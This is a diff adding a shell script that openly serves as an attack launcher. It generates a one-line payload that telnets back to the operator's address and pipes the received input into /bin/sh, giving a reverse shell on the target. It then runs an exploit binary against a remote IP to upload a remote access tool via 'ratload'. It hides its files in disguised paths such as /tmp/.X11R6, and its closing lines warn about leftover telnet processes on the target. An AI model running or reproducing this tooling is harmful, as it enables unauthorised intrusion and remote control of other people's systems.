@@ -1,0 +1,113 @@
+#!/bin/sh
+
+##########################################################
+### Generate & run the following script:
+### 	- script to upload rat via ratload (oneshot.scr)
+### 	- run grins/frowns/whatever using the above script
+##########################################################
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+GS_OPTION=frowns
+RUN_FILE=nscd
+#CALLBACKPORT=
+
+LOCAL_IP_GUESS=`ifconfig -a | grep inet | grep -v grep | grep -v "127\.0\.0\.1" | awk '{print $2}' | cut -d ":" -f 2`
+
+# Show usage and exit
+usage() {
+    echo ""
+#    echo "Before running this script, you first need to run the following:"
+#    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+#    echo "      (nc must be in your path; it's also run w/in this script)"
+#    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo ""
+    echo "Your local IP(s) appears to be:"
+    echo $LOCAL_IP_GUESS
+    echo ""
+    echo "Usage: ${0} [options]"
+    echo "  -i <remoteIP>                (required)"
+    echo "  -g <grins|frowns|sneer>      def= $GS_OPTION"
+    echo "  -l <localIP>                 (required)"
+    echo "  -n <localPort>               (required)"
+    exit 1
+}
+
+# There must be at least three arguments
+if [ ${#} -le 2 ]; then
+    usage
+fi
+
+#
+# Process args
+
+echo CommandLine: ${0} ${*}
+echo ""
+
+    while getopts g:i:n:l: op; do
+	case $op in
+	g)  GS_OPTION="$OPTARG";;
+	i)  REMOTE_IP="$OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	n)  LOCAL_PORT="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+    [ -z "$LOCAL_PORT" ] && echo "Error: missing local PORT" && usage
+
+
+#following line is now unused
+EXTRA="${*}"
+
+
+echo "Generating oneshot upload script." 
+
+cat > oneshot.scr << EOF
+/sbin/sh -c (telnet $LOCAL_IP $LOCAL_PORT </dev/console | /bin/sh )&
+EOF
+
+echo "oneshot script is as follows: "
+echo "========"
+cat oneshot.scr
+echo "========"
+echo ""
+
+OOPS=`wc -c oneshot.scr  |awk '{print $1}'`
+if [ ! -f "oneshot.scr" -o -z ${OOPS} -o ${OOPS} -ge 254 -o ${OOPS} -le 0 ]; then
+  echo "FATAL ERROR: oneshot.scr is either not there or too large"
+  exit 1
+fi 
+
+echo "You now need to run \"ratload\" in a local window,
+using local port $LOCAL_PORT"
+echo ""
+echo "About to run:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+
+echo "(Hit return when you've got ratload started)"
+read input
+
+
+echo "now running:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public
+
+echo "Looking to see if socket is still running locally"
+ps -eaf | grep -w socket | grep -v grep
+
+
+echo "Thank you for playing"
+
+### echo "removing intermediate scripts"
+### rm ./gr_upload.scr ./oneshot.scr ./gr_upload.uu 
+
+echo Done.
+echo
+echo "Don't forget to look for stray telnets running on target."
+echo "If there are you are totally hosed because you didn't use ftp."
